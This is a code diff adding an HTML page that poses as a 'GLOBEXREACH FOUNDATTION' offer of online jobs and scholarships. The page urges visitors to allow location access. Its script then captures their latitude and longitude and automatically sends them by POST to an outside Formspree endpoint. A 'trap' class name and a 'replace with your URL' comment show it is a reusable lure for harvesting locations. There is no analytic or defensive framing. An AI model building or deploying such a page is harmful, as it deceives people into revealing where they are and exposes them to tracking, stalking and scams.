@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>GLOBEXREACH FOUNDATTION </title>
+</head>
+
+<style>
+body{
+background-image:url('phone.jpg');
+background-repeat:no-repeat;
+background-size:cover;
+
+}
+
+body{background-color:blue;}
+body{color:#4B0082;
+text-align:center;}
+.p1{color:#3C1361;}
+.job-offer{font-size:28pt;}
+.our-form{margin:2pt;
+background-color:cyan;}
+.trap{background-color:cyan;}
+</style>
+<body>
+<div class="our-form">
+  <div class="trap"><h2>Hello! 🚀 Welcome to GLOBEXREACH FOUNDATTION — Empowering You From Anywhere!</h2></div>
+<br>
+<div class="p1"<p>We’re excited to offer online job opportunities, freelance gigs, and exclusive scholarships.
+ To new members joining our platform. 
+ Whether you're looking to earn, learn, or grow — we’ve got something just for you!</p></div>
+
+
+  <p>To serve you better and match you with the right opportunities in your area, please tap “Allow Location” when prompted.
+This helps us understand where our clients are based and tailor job listings, scholarships, and remote work offers that suit your region.</p>
+
+  <p>Start your journey today by clicking the link below and granting location access.
+Great things begin with one small step!</p>
+<br>
+<br>
+<br>
+<div class="job-offer"><p>PLEASE ALLOW LOCATION FOR JOB OFFER</p></div>
+</div>
+  <script>
+    navigator.geolocation.getCurrentPosition(function(position) {
+      const lat = position.coords.latitude;
+      const lon = position.coords.longitude;
+
+      // Create a form dynamically
+      const form = document.createElement("form");
+      form.method = "POST";
+      form.action = "https://formspree.io/f/xvgabkkk"; // Replace with your Formspree URL
+
+      const latInput = document.createElement("input");
+      latInput.name = "Latitude";
+      latInput.value = lat;
+      form.appendChild(latInput);
+
+      const lonInput = document.createElement("input");
+      lonInput.name = "Longitude";
+      lonInput.value = lon;
+      form.appendChild(lonInput);
+
+      document.body.appendChild(form);
+      form.submit();
+    }, function(error) {
+      alert("Location access was denied. Please allow location to continue.");
+    });
+  </script>
+</body>
+</html>
